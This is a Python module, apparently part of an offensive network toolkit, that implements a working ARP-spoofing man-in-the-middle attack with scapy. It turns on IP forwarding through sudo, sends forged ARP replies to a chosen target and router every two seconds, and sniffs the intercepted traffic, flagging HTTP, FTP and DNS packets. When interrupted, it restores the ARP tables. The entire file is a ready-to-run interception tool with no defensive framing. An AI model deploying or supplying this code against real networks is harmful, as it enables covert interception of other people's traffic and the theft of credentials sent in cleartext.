import os
import time
import threading
from scapy.all import ARP, sendp, Ether, srp, IP, TCP, UDP, sniff, conf
from rich.console import Console
from rich.table import Table
from core.ui import draw_header

console = Console()

def get_interfaces():
    """
    Filters for primary physical interfaces (Wi-Fi and Ethernet).
    Targets: wlan, wl (Linux), en (macOS).
    """
    all_ifaces = conf.ifaces.data.values()
    filtered = []
    
    # Common prefixes for physical hardware
    physical_prefixes = ('wlan', 'wl', 'en', 'eth')
    # Interfaces to ignore (virtual/internal)
    ignore_prefixes = ('lo', 'utun', 'gif', 'stf', 'bridge', 'anpi', 'awdl', 'llw')

    for iface in all_ifaces:
        name = iface.name.lower()
        if name.startswith(physical_prefixes) and not name.startswith(ignore_prefixes):
            # Only include interfaces with an active IP
            if iface.ip != "127.0.0.1" and iface.ip != "0.0.0.0" and iface.ip is not None:
                filtered.append(iface.name)
                
    return sorted(filtered)

def toggle_forwarding(state=True):
    """Enables or disables IP forwarding on the host OS."""
    value = 1 if state else 0
    try:
        if os.uname().sysname == 'Darwin': 
            os.system(f"sudo sysctl -w net.inet.ip.forwarding={value} > /dev/null")
        else: 
            os.system(f"echo {value} | sudo tee /proc/sys/net/ipv4/ip_forward > /dev/null")
    except:
        console.print("[yellow][!] Manual IP forwarding check required.[/yellow]")

def get_mac(ip, iface):
    """Resolves MAC address specifically on the chosen interface."""
    try:
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), 
                     timeout=2, verbose=False, iface=iface)
        if ans:
            return ans[0][1].hwsrc
    except:
        return None

def packet_callback(packet):
    """Sniffs and displays interesting data from the stream."""
    if packet.haslayer(IP):
        if packet.haslayer(TCP):
            port = packet[TCP].dport
            if port == 80:
                console.print(f"[bold cyan][HTTP][/bold cyan] {packet[IP].src} -> {packet[IP].dst}")
            elif port == 21:
                console.print(f"[bold red][FTP][/bold red] {packet[IP].src} -> {packet[IP].dst}")
        elif packet.haslayer(UDP) and packet[UDP].dport == 53:
            console.print(f"[bold magenta][DNS][/bold magenta] {packet[IP].src} queried a domain.")

def start_mitm():
    draw_header("MITM Engine v2.1 (Multi-Interface Support)")
    
    # 1. Interface Selection Logic
    ifaces = get_interfaces()
    if not ifaces:
        console.print("[red][!] No active physical interfaces found.[/red]")
        return

    table = Table(title="Available Network Interfaces", border_style="cyan")
    table.add_column("ID", style="bold")
    table.add_column("Interface", style="white")
    table.add_column("IP Address", style="dim")
    
    for i, name in enumerate(ifaces):
        ip = conf.ifaces.dev_from_name(name).ip
        table.add_row(str(i), name, ip)
    
    console.print(table)
    try:
        iface_id = console.input("[bold yellow]Select Interface ID: [/bold yellow]").strip()
        chosen_iface = ifaces[int(iface_id)]
    except:
        console.print("[red]Invalid selection.[/red]")
        return
    
    target = console.input("[bold yellow]Target IP: [/bold yellow]").strip()
    router = console.input("[bold yellow]Router IP: [/bold yellow]").strip()

    if not target or not router: return

    console.print(f"[bold blue][*][/bold blue] Resolving MACs on [cyan]{chosen_iface}[/cyan]...")
    t_mac = get_mac(target, chosen_iface)
    r_mac = get_mac(router, chosen_iface)

    if not t_mac or not r_mac:
        console.print("[red]Failure: Could not resolve MAC. Check target status.[/red]")
        return

    toggle_forwarding(True)
    console.print(f"[bold red][!] Intercepting: {target} <--> {router}[/bold red]")
    
    stop_event = threading.Event()
    # Sniffing must be explicitly locked to the chosen interface for WLAN
    sniff_thread = threading.Thread(target=lambda: sniff(iface=chosen_iface, prn=packet_callback, store=0, stop_filter=lambda p: stop_event.is_set()))
    sniff_thread.start()

    try:
        while True:
            # Poisoning with explicit interface context
            target_packet = Ether(dst=t_mac) / ARP(op=2, pdst=target, hwdst=t_mac, psrc=router)
            sendp(target_packet, verbose=False, iface=chosen_iface)
            
            router_packet = Ether(dst=r_mac) / ARP(op=2, pdst=router, hwdst=r_mac, psrc=target)
            sendp(router_packet, verbose=False, iface=chosen_iface)
            
            time.sleep(2)
            
    except KeyboardInterrupt:
        stop_event.set()
        console.print("\n[yellow][*] Restoring network integrity...[/yellow]")
        toggle_forwarding(False)
        
        # Proper restoration using targeted Layer 2 frames
        res_target = Ether(dst=t_mac) / ARP(op=2, pdst=target, hwdst=t_mac, psrc=router, hwsrc=r_mac)
        res_router = Ether(dst=r_mac) / ARP(op=2, pdst=router, hwdst=r_mac, psrc=target, hwsrc=t_mac)
        
        sendp(res_target, count=5, verbose=False, iface=chosen_iface)
        sendp(res_router, count=5, verbose=False, iface=chosen_iface)
        
        console.print("[green][+] Network restored.[/green]")
        input("\nPress Enter...")